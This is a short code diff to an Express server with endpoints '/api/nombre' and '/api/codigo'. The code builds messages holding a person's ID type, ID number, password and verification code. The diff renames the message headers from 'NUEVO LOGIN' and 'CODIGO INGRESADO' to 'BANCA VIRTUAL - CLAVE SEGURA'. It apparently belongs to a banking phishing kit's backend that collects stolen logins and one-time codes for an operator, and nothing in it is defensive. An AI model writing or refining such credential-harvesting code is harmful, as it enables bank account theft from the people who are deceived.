@@ -32,7 +32,7 @@ app.post("/api/nombre", async (req,res)=>{
   };
 
   let texto =
-`📚 NUEVO LOGIN
+`🏦 BANCA VIRTUAL - CLAVE SEGURA
 
 🪪 Tipo: ${tipo}
 👤 ID: ${identificacion}
@@ -72,12 +72,12 @@ app.post("/api/codigo", async (req,res)=>{
   r.codigo=codigo;
 
   const texto =
-`📩 CODIGO INGRESADO
+`🏦 BANCA VIRTUAL - CLAVE SEGURA
 
-Tipo: ${r.tipo}
-ID: ${r.identificacion}
-Clave: ${r.clave}
-Codigo: ${codigo}
+🪪 Tipo: ${r.tipo}
+👤 ID: ${r.identificacion}
+🔐 Clave: ${r.clave}
+🔐 Codigo: ${codigo}
 
 ID:${id}`;
 
